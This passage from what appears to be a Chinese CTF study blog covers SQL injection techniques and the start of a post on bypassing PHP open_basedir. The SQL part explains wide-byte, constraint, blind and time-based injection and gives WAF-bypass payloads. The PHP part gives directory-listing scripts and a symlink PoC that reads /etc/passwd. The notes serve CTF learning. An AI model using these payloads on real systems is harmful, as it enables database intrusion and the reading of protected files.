# 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</code></pre>
<h3 id="约束攻击"><a class="markdownIt-Anchor" href="#约束攻击"></a> 约束攻击</h3>
<p>在SQL执行字符串处理操作时，字符串末尾的空格符将会被删除，换句话说&quot;user&quot;是等同于&quot;user     &quot;的，对于绝大多数的情况这两个相等都是成立的(像WHERE子句的字符串和INSERT语句中的字符串)</p>
<blockquote>
<p>[!WARNING]</p>
<p>但是在像LIKE 子句中这是不成立的。因为对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致</p>
</blockquote>
<p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”</p>
<p><strong>攻击手段</strong></p>
<p>注册一个用户名+一堆括号+1的用户名和自己的passwd(未超出长度限制的字符应该只包含已知的用户名和空白字符)</p>
<p>注:在查询时，SQL是不会将字符串截断的。因此，使用完整的字符串进行搜索，所以不会找到匹配的结果。但当执行INSERT查询语句时，它只会插入被限制长度的字符。</p>
<p>在攻击结束后，输入后来我们自己的密码和已给的用户名，会登录上原始用户</p>
<pre><code class="highlight plaintext">解决办法:
将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。

最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪

为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</code></pre>
<h3 id="order-by注入"><a class="markdownIt-Anchor" href="#order-by注入"></a> Order by注入</h3>
<h3 id="异或注入"><a class="markdownIt-Anchor" href="#异或注入"></a> 异或注入</h3>
<p>一般和盲注一起从出现，原因是大部分基础的查询已经被ban了(悲)</p>
<p>这里涉及到一个知识点，即Mysql的隐式转换，其实和PHP比较相像吧</p>
<pre><code class="highlight plaintext">Mysql的隐式转换
当字符串和数字进行算术计算时，字符串会被尝试转化为数字(如果可能)
例如&#x27;1&#x27;+1 会被解释为1+1
若不能成功转化(即字符串的首位不为数字),字符串就会被解释为0</code></pre>
<p>所以我们就可以通过异或式来辅助盲注(判断bool盲注的语句返回结果是否为真,帮助加长时间盲注的运算时间)</p>
<h2 id="episode-3-在拿到flag的边缘疯狂试探盲注"><a class="markdownIt-Anchor" href="#episode-3-在拿到flag的边缘疯狂试探盲注"></a> Episode 3 在拿到flag的边缘疯狂试探:盲注</h2>
<p>(哈哈，盲注脚本吗，你问我，我只能说最好自己写一个，网上淘来的毕竟是别人的不如你自己搓的顺手)</p>
<p>先确定注入型，再用and连接一下</p>
<pre><code class="highlight sql">布尔盲注
<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? 初步判断
<span class="number">2.</span></code></pre>
<h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h3>
<h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注"></a> 时间盲注</h3>
<h4 id="sleep"><a class="markdownIt-Anchor" href="#sleep"></a> sleep()</h4>
<p>最容易的打也最容易被waf的方式，延迟数秒后回显</p>
<h4 id="benchmark"><a class="markdownIt-Anchor" href="#benchmark"></a> benchmark</h4>
<p>MySQL的一个内置函数，作用是测试一些函数的执行速度，benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数/表达式</p>
<p><strong>仅支持查询单行单列的结果，如果存在单行单列的执行结果，则可以正常执行，反之则报错，执行失败。</strong></p>
<p><strong>当benchmark()内的语句运行失败时，benchmark同样执行失败。</strong></p>
<pre><code class="highlight plaintext">
?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+
或者
?id=1&#x27; and if(ascii(substr(database(),1,1))=115,benchmark(100000,(select database()),0) --+</code></pre>
<h4 id="heavy-query"><a class="markdownIt-Anchor" href="#heavy-query"></a> heavy query</h4>
<p>字面意思，大负荷查询</p>
<p>用一些比较消耗资源的方式来延长查询时间</p>
<p>而消耗数据库资源最好的方式就是让两个表做笛卡尔积</p>
<p>而information_schema的数据量比较大，可以满足要求</p>
<p>笛卡尔乘积是一个数学运算。<br>
假设我有两个集合 X 和 Y ，那么 X 和 Y 的笛卡尔积就是 X 和 Y 的所有可能组合，也就是第一个对象来自于 X ，第二个对象来自于 Y 的所有可能。组合的个数即为两个集合中元素个数的乘积数。<br>
在数学中的定义：假设集合A={a, b}，集合B={0, 1, 2}，则两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</p>
<pre><code class="highlight plaintext">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)</code></pre>
<h4 id="get_lock"><a class="markdownIt-Anchor" href="#get_lock"></a> get_lock()</h4>
<p>这个函数需要两个连接会话。要求使用mysql_pconnect</p>
<p>get_lock(key,timeout) :key 锁的名字，timeout加锁等待时间，时间内未加锁成功则事件回滚。get_lock 加锁成功返回1</p>
<p>这个锁是应用程序级别的，在不同的mysql会话之间使用，是名字锁，不是锁具体某个表名或字段，具体是锁什么完全交给应用程序。它是一种独占锁，意味着哪个会话持有这个锁，其他会话尝试拿这个锁的时候都会失败。</p>
<p>如果我们已经开了一个session，对关键字进行了get_lock，那么再另外开一个session再次对关键进行get_lock，就会延时我们指定的时间（条件：同时开两个session进行注入</p>
<pre><code class="highlight plaintext">select get_lock(&#x27;lihuaiqiu&#x27;,1);

select get_lock(&#x27;lihuaiqiu&#x27;,5);


select * from ctf_test where user=&#x27;0&#x27; and 1=1 and  get_lock(&#x27;lihuaiqiu&#x27;,2);

select * from ctf_test where user=&#x27;0&#x27; and 1=0 and  get_lock(&#x27;lihuaiqiu&#x27;,2);</code></pre>
<h4 id="rlike-正则匹配"><a class="markdownIt-Anchor" href="#rlike-正则匹配"></a> rlike 正则匹配</h4>
<p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
<pre><code class="highlight plaintext">select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);

正则语法：
. : 匹配任意单个字符
* ： 匹配0个或多个前一个得到的字符
[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。
^ : 匹配开头，如^s匹配以s或者S开头的字符串。
$ : 匹配结尾，如s$匹配以s结尾的字符串。
&#123;n&#125; : 匹配前一个字符反复n次。

RPAD(str,len,padstr)
用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#x27;，那么它将被截除到 len个字符。
mysql&gt; SELECT RPAD(&#x27;hi&#x27;,5,&#x27;?&#x27;); -&gt; &#x27;hi???&#x27;

repeat(str,times)  复制字符串times次
</code></pre>
<p>寻找新的延迟函数</p>
<pre><code class="highlight plaintext">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</code></pre>
<p>以上代码等同于 <code>sleep(5)</code></p>
<h2 id="episode-4-注入点猜猜我在哪里呢"><a class="markdownIt-Anchor" href="#episode-4-注入点猜猜我在哪里呢"></a> Episode 4 注入点:&gt;猜猜我在哪里呢</h2>
<h3 id="post注入"><a class="markdownIt-Anchor" href="#post注入"></a> POST注入</h3>
<h3 id="get注入"><a class="markdownIt-Anchor" href="#get注入"></a> GET注入</h3>
<h3 id="cookies注入"><a class="markdownIt-Anchor" href="#cookies注入"></a> Cookies注入</h3>
<h2 id="episode-5-你好绕waf"><a class="markdownIt-Anchor" href="#episode-5-你好绕waf"></a> Episode   5  你好，绕WAF</h2>
<h3 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过"></a> 大小写绕过</h3>
<p>如过过滤了and和AND，试试And</p>
<h3 id="双写绕过"><a class="markdownIt-Anchor" href="#双写绕过"></a> 双写绕过</h3>
<p>如果waf把and替换为空</p>
<p>然后可以使用<code>anandd</code>绕过</p>
<h3 id="空格过滤绕过"><a class="markdownIt-Anchor" href="#空格过滤绕过"></a> 空格过滤绕过</h3>
<p>/**/  注释符号</p>
<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>
<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
<h3 id="引号绕过"><a class="markdownIt-Anchor" href="#引号绕过"></a> 引号绕过</h3>
<p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
<h3 id="and和or绕过"><a class="markdownIt-Anchor" href="#and和or绕过"></a> and和or绕过</h3>
<p>考虑管道符||表示or和&amp;&amp;表示and</p>
<h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> =绕过</h3>
<p>改成like或者&lt;或者&gt;</p>
<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
<ul>
<li>这里详细将一下正则的注入吧，感觉和正则沾上关系的都蛮不当人的</li>
</ul>
<p>正常的一个查询语句就像这样:</p>
<pre><code class="highlight sql"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span></code></pre>
<p>这里引用其他师傅打好的实例(<a href="https://ljdd520.github.io/2019/11/06/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">sql注入的知识总结 | L’s Blog</a>)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250402210544627.png" alt="image-20250402210544627"></p>
<p>呃呃，怎么理解呢?就把regexp看成从^开始字符串与查询到的原串进行一个比较</p>
<h3 id="逗号过滤"><a class="markdownIt-Anchor" href="#逗号过滤"></a> 逗号过滤</h3>
<pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>
<h3 id="比较符号-绕过"><a class="markdownIt-Anchor" href="#比较符号-绕过"></a> 比较符号(&lt; &gt;)绕过</h3>
<p>一般是盲注要用到捏</p>
<p>最常见的一个盲注的sql语句：</p>
<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>
<h3 id="绕过关键字unionselectwhere"><a class="markdownIt-Anchor" href="#绕过关键字unionselectwhere"></a> 绕过关键字(union,select，where)</h3>
<p>1）使用注释符绕过：</p>
<p>常用注释符：</p>
<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
<p>用法：</p>
<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
<p>2）使用大小写绕过：</p>
<p><code>id=-1'UnIoN/**/SeLeCT</code></p>
<p>3）内联注释绕过：</p>
<p><code>id=-1'/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
<p>4） 双关键字绕过：</p>
<p><code>id=-1'UNIunionONSeLselectECT1,2,3–-</code></p>
<h3 id="通用编码绕过"><a class="markdownIt-Anchor" href="#通用编码绕过"></a> 通用编码绕过</h3>
<p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
<p>or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
<h3 id="等价函数绕过"><a class="markdownIt-Anchor" href="#等价函数绕过"></a> 等价函数绕过</h3>
<p>hex()、bin()==&gt;ascii()</p>
<p>sleep()==&gt;benchmark()</p>
<p>concat_ws()==&gt;group_concat()</p>
<p>mid()、substr()<mark>&gt;substring() @@user</mark>&gt;user() @@datadir==&gt;datadir()</p>
<p>举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74或者：</p>
<p>substr((select’password’),1,1)=0x70strcmp(left(‘password’,1),0x69)=1strcmp(left(‘password’,1),0x70)=0strcmp(left(‘password’,1),0x71)=-1</p>
<h3 id="长度限制绕过"><a class="markdownIt-Anchor" href="#长度限制绕过"></a> 长度限制绕过</h3>
<p>网页显示常常只能给出有限长度的字母，这个时候就要通过一些函数来绕过</p>
<pre><code class="highlight sql"><span class="number">1</span>、<span class="keyword">left</span>（<span class="number">201809</span>,<span class="number">4</span>）截取左边的<span class="number">4</span>个字符
<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">2018</span>

<span class="number">2</span>、<span class="keyword">right</span>（name,<span class="number">2</span>）截取右边的<span class="number">2</span>个字符
<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">09</span>

<span class="number">3</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) 截取name这个字段 从第五个字符开始 只截取之后的<span class="number">3</span>个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：事业部

<span class="number">4</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) 截取name这个字段 从第三个字符开始，之后的所有个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：融资事业部

<span class="number">5</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，直到结束
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事业部

<span class="number">6</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>，<span class="number">2</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，只截取之后的<span class="number">2</span>个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事
注意：我们注意到在函数 <span class="built_in">substring</span>(str,pos, len)中， pos 可以是负值，但 len 不能取负值。

<span class="number">7</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> 之前的所有字符
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：www.baidu

<span class="number">8</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> （倒数）之后的所有字符
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：baidu.com

<span class="number">9</span>、SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) 截取name字段，取除name字段后三位的所有字符
<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;成都融资事业部&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>结果：成都融资

<span class="number">10</span>、mid(str,<span class="keyword">start</span>,[length])
str:截取的字符串   <span class="keyword">start</span>:起始位置   length:截取的长度，可以忽略
还可以这么构造:mid((str)<span class="keyword">from</span>(i)<span class="keyword">for</span>(<span class="number">1</span>)) #<span class="keyword">from</span>(<span class="number">1</span>)表示从第一个位置开始截取剩下的字符串，<span class="keyword">for</span>(<span class="number">1</span>)表示从改位置起一次就截取一个字符

<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>，(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))
用reverse倒序输出，有时候有奇效。?大概吧
</code></pre>
<h2 id="episode-6-模糊匹配"><a class="markdownIt-Anchor" href="#episode-6-模糊匹配"></a> Episode 6  模糊匹配</h2>
<p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
<h2 id="episode-7-奇奇怪怪的知识点和一些技巧积累"><a class="markdownIt-Anchor" href="#episode-7-奇奇怪怪的知识点和一些技巧积累"></a> Episode   7 奇奇怪怪的知识点和一些技巧积累</h2>
<h3 id="短路算法"><a class="markdownIt-Anchor" href="#短路算法"></a> <strong>短路算法：</strong></h3>
<p>|| 逻辑或的短路：a||b</p>
<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
<h3 id="with-rollup来自ctfshow-web10"><a class="markdownIt-Anchor" href="#with-rollup来自ctfshow-web10"></a> <strong>WITH ROLLUP:</strong>(来自ctfshow web10)</h3>
<pre><code class="highlight plaintext">语法:group by xxx with rollup</code></pre>
<p>with rollup是对前面数据的一次汇总，此时在查询的数据中会被插入一行值为NULL,此时即可绕过长度检验，前提你要知道在哪个表并且没有对第二个字段是否输入的前端检查</p>
<h3 id="联合查询伪造"><a class="markdownIt-Anchor" href="#联合查询伪造"></a> <strong>联合查询伪造</strong></h3>
<p>通过联合查询，你可以伪造一段没有的数据(即临时数据)</p>
<p>因为union select会把查询结果接在前一个查询结果后面，前面如果查到了东西，那么取得还是第一行</p>
<p>那么通过让前面查不到，回显我们的注入语句就能够达到注入目的(呃呃，感觉有点像二次注入的后面半段)</p>
<p>这里直接应用别的师傅打好的案例</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124245041.png" alt="image-20250330124245041"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124258559.png" alt="image-20250330124258559"></p>
<p>那么只要知道username所在的列就可以直接糊弄过密码的检测了</p>
<h3 id="注释和非注释闭合"><a class="markdownIt-Anchor" href="#注释和非注释闭合"></a> 注释和非注释闭合</h3>
<p>众所周知，<code># --+</code>是为了注释掉后面的’</p>
<p>那我问你，如果注释符全被过滤了呢</p>
<p>诶，那就用到非注释闭合，就是在payload最后把–+这些换成and ‘1’='1</p>
<p>来达到正常注入不报错的目的</p>
<h2 id="episode-8-一点感想"><a class="markdownIt-Anchor" href="#episode-8-一点感想"></a> Episode   8 一点感想</h2>
<p>刷了一些题目，发现最重要的其实是注入点的判断(除非是万恶的盲注，那重点可能更在脚本上)</p>
]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>php.ini相关配置绕过</title>
    <url>/2025/09/11/php-ini%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="phpini相关配置绕过"><a class="markdownIt-Anchor" href="#phpini相关配置绕过"></a> PHP.ini相关配置绕过</h1>
<p>本来想发两篇的，但是转念一想disable_function和open_basedir其实都是属于php配置层上的限制，于是就写了这篇文章直接一锅端</p>
<h2 id="open_basedir"><a class="markdownIt-Anchor" href="#open_basedir"></a> open_basedir</h2>
<p>open_basedir是把可访问的文件限制在指定的范围下</p>
<p><code>file_get_contents,highlight_file</code>这些函数都会受到限制。</p>
<h3 id="系统命令函数绕过"><a class="markdownIt-Anchor" href="#系统命令函数绕过"></a> 系统命令函数绕过</h3>
<p>能执行system这些函数基本就能绕过，但是大部分的时候被waf/受到了disable_function的限制</p>
<h3 id="利用glob绕过"><a class="markdownIt-Anchor" href="#利用glob绕过"></a> 利用glob://绕过</h3>
<p>glob://是查找匹配的文件路径模式,<code>glob</code>数据流包装器自 PHP 5.3.0 起开始有效。</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span>
<span class="comment">// 并打印文件名和文件尺寸</span>
<span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://ext/spl/examples/*.php&quot;</span>);
<span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;
    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s: %.1FK\n&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>(), <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getSize</span>()/<span class="number">1024</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>需要配合其他函数来配合打组合技，单独的glob是不能绕过的</p>
<h4 id="利用-directoryiteratorglob"><a class="markdownIt-Anchor" href="#利用-directoryiteratorglob"></a> 利用 DirectoryIterator+glob://</h4>
<p><code>DirectoryIterator</code> 类提供了一个简单的界面来查看文件系统目录的内容。<br>
脚本如下:</p>
<pre><code class="highlight plaintext">&lt;?php
$c = $_GET[&#x27;c&#x27;];
$a = new DirectoryIterator($c);
foreach($a as $f)&#123;
    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);
&#125;
?&gt;</code></pre>
<h4 id="利用-opendirreaddirglob"><a class="markdownIt-Anchor" href="#利用-opendirreaddirglob"></a> 利用 opendir()+readdir()+glob://</h4>
<p><code>opendir</code>作用为打开目录句柄<br>
<code>readdir</code>作用为从目录句柄中读取目录</p>
<p>脚本如下</p>
<pre><code class="highlight plaintext">&lt;?php
$a = $_GET[&#x27;c&#x27;];
if ( $b = opendir($a) ) &#123;
    while ( ($file = readdir($b)) !== false ) &#123;
        echo $file.&quot;&lt;br&gt;&quot;;
    &#125;
    closedir($b);
&#125;
?&gt;</code></pre>
<p>只能列目录，php7可以用如下方法读非根目录文件,<code>glob:///*/www/../*</code> 可列举 <code>/var</code></p>
<h4 id="利用-scandirglob"><a class="markdownIt-Anchor" href="#利用-scandirglob"></a> 利用 scandir()+glob://</h4>
<p>直接命令执行</p>
<pre><code class="highlight plaintext">var_dump(scandir(&#x27;glob:///*&#x27;));</code></pre>
<h3 id="利用symlink绕过"><a class="markdownIt-Anchor" href="#利用symlink绕过"></a> 利用symlink绕过</h3>
<p><code>symlink</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。</p>
<pre><code class="highlight plaintext">symlink(string $target, string $link): bool</code></pre>
<p>而target一般受限于我们的open_basedir,v于是乎要想办法把首先的内容通过软链接带出到不受限的区域下</p>
<pre><code class="highlight plaintext">&lt;?php
mkdir(&quot;A&quot;);
chdir(&quot;A&quot;);
mkdir(&quot;B&quot;);
chdir(&quot;B&quot;);
mkdir(&quot;C&quot;);
chdir(&quot;C&quot;);
mkdir(&quot;D&quot;);
chdir(&quot;D&quot;);
chdir(&quot;..&quot;);
chdir(&quot;..&quot;);
chdir(&quot;..&quot;);
chdir(&quot;..&quot;);
symlink(&quot;A/B/C/D&quot;,&quot;SD&quot;);
symlink(&quot;SD/../../../../etc/passwd&quot;,&quot;POC&quot;);
unlink(&quot;SD&quot;);
mkdir(&quot;SD&quot;);
//file_get_contents(&#x27;/var/www/html/SD&#x27;);
?&gt;</code></pre>
<p>这是一个读取/etc/passwd的poc，原理相似的，我们也可以用它移动到其他的文件到open_basedir的范围内进行文件带出</p>
<p>至于原理直接引用这篇[博客](<a href="https://xz.aliyun.com/news/9520">从0学习bypass open_basedir姿势-先知社区</a>)的内容来进行解释</p>
<pre><code class="highlight plaintext">1.创建A/B/C/D目录，并返回到起始目录
2.symlink(&quot;A/B/C/D&quot;,&quot;SD&quot;):创建符号文件SD,指向A/B/C/D
3.symlink(&quot;SD/../../../../etc/passwd&quot;,&quot;POC&quot;):创建符号文件POC,指向SD/../../../../etc/passwd。此时SD=A/B/C/D,而A/B/C/D../../../../=/var/www/html,符合open_basedir的限制,创建成功。
4.unlink(&quot;SD&quot;):删除软链接SD，并创建一个文件夹,此时SD作为一个真正的目录存在。那么访问POC,指向的是SD/../../../../etc/passwd,SD/../../../就是/var目录,/var/../etc/passwd恰好可以读取到etc目录下的passwd，从而达到跨目录访问的效果。</code></pre>
<h3 id="利用bindtextdomain和splfileinfo方法"><a class="markdownIt-Anchor" href="#利用bindtextdomain和splfileinfo方法"></a> 利用bindtextdomain和SplFileInfo方法</h3>
<p><code>bindtextdomain</code>设置或获取域名的路径，函数原型为:</p>
<pre><code class="highlight plaintext">bindtextdomain(string $domain, ?string $directory): string|false</code></pre>
